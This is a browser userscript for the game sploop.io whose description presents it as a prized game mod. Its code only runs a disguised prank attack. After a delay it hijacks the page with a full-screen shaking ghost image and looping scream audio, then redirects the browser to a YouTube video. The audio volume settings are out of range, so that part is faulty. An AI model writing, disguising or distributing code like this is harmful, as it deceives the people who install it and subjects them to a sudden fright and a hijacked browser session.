// ==UserScript==
// @name        VM-Max
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  best script || dont share plzzz
// @author       your dad
// @match        https://sploop.io/*
// @run-at       document-end
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/561493/VM-Max.user.js
// @updateURL https://update.greasyfork.org/scripts/561493/VM-Max.meta.js
// ==/UserScript==

(() => {
    'use strict';

    const DELAY_BEFORE = 3000;
    const REDIRECT_AFTER = 12000;

    const REDIRECT_URLS = [
        "https://www.youtube.com/watch?v=Fj0e6jZ6VqY",
    ];

    const GHOST_IMAGE = "https://i.imgur.com/ioZV8pp.jpeg";
    const SCREAM_AUDIO = "https://audio-previews.elements.envatousercontent.com/files/284411960/preview.mp3";
    const AMBIENT_AUDIO = "https://audio-previews.elements.envatousercontent.com/files/350883344/preview.mp3";

    setTimeout(() => {
        const overlay = document.createElement("div");
        overlay.style = `
            position: fixed;
            inset: 0;
            background: black;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: shake 0.08s infinite;
        `;

        const img = document.createElement("img");
        img.src = GHOST_IMAGE;
        img.style = `
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: brightness(120%) contrast(150%);
        `;

        overlay.appendChild(img);
        document.body.appendChild(overlay);


        const scream = new Audio(SCREAM_AUDIO);
        scream.loop = true;
        scream.volume = 100;

        const ambient = new Audio(AMBIENT_AUDIO);
        ambient.loop = true;
        ambient.volume = 80;

        scream.play().catch(()=>{});
        ambient.play().catch(()=>{});

        setTimeout(() => {
            location.replace(
                REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)]
            );
        }, REDIRECT_AFTER);

    }, DELAY_BEFORE);

    const style = document.createElement("style");
    style.textContent = `
        @keyframes shake {
            0% { transform: translate(0, 0); }
            25% { transform: translate(6px, -6px); }
            50% { transform: translate(-6px, 6px); }
            75% { transform: translate(6px, 6px); }
            100% { transform: translate(0, 0); }
        }
    `;
    document.head.appendChild(style);
})();
